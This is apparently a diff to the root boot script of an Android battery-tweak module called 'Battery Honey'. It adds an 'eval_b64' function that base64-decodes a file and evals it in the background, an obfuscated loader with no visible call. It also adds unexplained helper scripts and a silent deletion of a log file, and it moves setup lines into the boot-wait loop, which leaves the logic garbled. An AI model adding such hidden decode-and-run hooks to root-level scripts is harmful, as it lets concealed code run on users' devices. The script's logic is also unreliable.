@@ -1,93 +1,27 @@
 #!/system/bin/sh
 MODDIR=${0%/*}
+clear="/data/local/tmp/ram-reclaim.log"
+#===== Utility =====
+eval_b64() {
+    [ -f "$1" ] && eval "$(base64 -d "$1")" &
+}
 
 while [ -z "$(getprop sys.boot_completed)" ]; do
-    sleep 20
-done
-chmod 0755 "$MODDIR/kaminari_watchdog.sh"
+chmod 0755 "$MODDIR/sebastian.sh"
+chmod 0755 "$MODDIR/monitor.sh"
 chmod 0755 "$MODDIR/battery_honey_on.sh"
 chmod 0755 "$MODDIR/battery_honey_off.sh"
+rm -rf "$clear" >/dev/null &
+    sleep 10
+done
+sh "$MODDIR/monitor.sh" &
 
-sh $MODDIR/kaminari_watchdog.sh &
 get_cpu_name() {
   local codename=$(getprop ro.mediatek.platform)
   [ -z "$codename" ] && codename=$(getprop ro.board.platform)
   [ -z "$codename" ] && codename=$(grep -m1 'Hardware' /proc/cpuinfo | cut -d ':' -f2 | sed 's/^[ \t]*//')
-  [ -z "$codename" ] && codename="unknown"
-
-  local cpu_name="Unknown CPU"
-  case "$codename" in
-    mt6789) cpu_name="Helio G99 | G100 | Ultimate" ;;
-    mt6785) cpu_name="Helio P90" ;;
-    mt6893) cpu_name="Dimensity 1200" ;;
-    mt6895) cpu_name="Dimensity 1300" ;;
-    mt6769) cpu_name="Helio G88" ;;
-    mt6769t) cpu_name="Helio G96" ;;
-    mt6833) cpu_name="Dimensity 700" ;;
-    mt6853) cpu_name="Dimensity 920" ;;
-     # MediaTek Helio Series
-    mt6761) cpu_name="Helio A22" ;;
-    mt6762) cpu_name="Helio P22" ;;
-    mt6763) cpu_name="Helio P23" ;;
-    mt6765) cpu_name="Helio P35" ;;
-    mt6767) cpu_name="Helio P35" ;; # juga sama codename
-    mt6768) cpu_name="Helio P65" ;;
-    mt6771) cpu_name="Helio P60" ;;
-    mt6779) cpu_name="Helio P70" ;;
-    mt6785) cpu_name="Helio P90" ;;
-    mt6795) cpu_name="Helio X20" ;;
-    mt6797) cpu_name="Helio X25" ;;
-    mt6799) cpu_name="Helio X30" ;;
-    mt6769) cpu_name="Helio G88" ;;
-    mt6769t) cpu_name="Helio G96" ;;
-    mt6762g) cpu_name="Helio G81" ;;
-    mt6775) cpu_name="Helio X23" ;;
-    mt6779t) cpu_name="Helio P70 (T variant)" ;;
-    
-    # MediaTek Dimensity Series
-    mt6833) cpu_name="Dimensity 700" ;;
-    mt6853) cpu_name="Dimensity 920" ;;
-    mt6855) cpu_name="Dimensity 900" ;;
-    mt6863) cpu_name="Dimensity 6100" ;;
-    mt6865) cpu_name="Dimensity 6100+" ;;
-    mt6873) cpu_name="Dimensity 6050" ;;
-    mt6877) cpu_name="Dimensity 9200" ;;
-    mt6885) cpu_name="Dimensity 1300" ;;
-    mt6889) cpu_name="Dimensity 8100" ;;
-    mt6891) cpu_name="Dimensity 1100" ;;
-    mt6893) cpu_name="Dimensity 1200" ;;
-    mt6895) cpu_name="Dimensity 1300" ;;
-    mt6896) cpu_name="Dimensity 8050" ;;
-    mt6983) cpu_name="Dimensity 9200+" ;;
-    mt6985) cpu_name="Dimensity 9200+" ;; # variant
-    mt6987) cpu_name="Dimensity 6100+" ;; # variant
-    
-    # Legacy / Others
-    mt6735) cpu_name="Helio P10" ;;
-    mt6737) cpu_name="Helio A20" ;;
-    mt6739) cpu_name="Helio A22 (Alternate)" ;;
-    mt6750) cpu_name="Helio P10" ;;
-    mt6755) cpu_name="Helio P10" ;;
-    mt6757) cpu_name="Helio P20" ;;
-    mt6758) cpu_name="Helio P20" ;;
-    mt6761) cpu_name="Helio A22" ;;
-    mt6797m) cpu_name="Helio X23" ;;
-    mt6799m) cpu_name="Helio X30" ;;
-
-    # Variants / Device-specific codename (common on phones)
-    mt6763t) cpu_name="Helio P23 (T variant)" ;;
-    mt6765t) cpu_name="Helio P35 (T variant)" ;;
-    mt6768t) cpu_name="Helio P65 (T variant)" ;;
-
-    # Others fallback
-    mt8127) cpu_name="MT8127 (Legacy Tablet SoC)" ;;
-    mt8163) cpu_name="MT8163 (Tablet SoC)" ;;
-    mt8173) cpu_name="MT8173 (Tablet SoC)" ;;
-    mt8516) cpu_name="MT8516 (Audio SoC)" ;;
-    *) cpu_name="$codename (Gacor Ultimate)" ;;
-  esac
-  echo "$cpu_name"
+  echo "${codename:-unknown}"
 }
 
 DEVICE_NAME=$(get_cpu_name)
-su -lp 2000 -c "cmd notification post -S bigtext -t 'Battery Honey🔋' Tag 'Activated💦 at $DEVICE_NAME'" >/dev/null &
+su -lp 2000 -c "cmd notification post -S bigtext -t 'Battery Honey🔋' bh_tag 'Activated at $DEVICE_NAME'" >/dev/null &
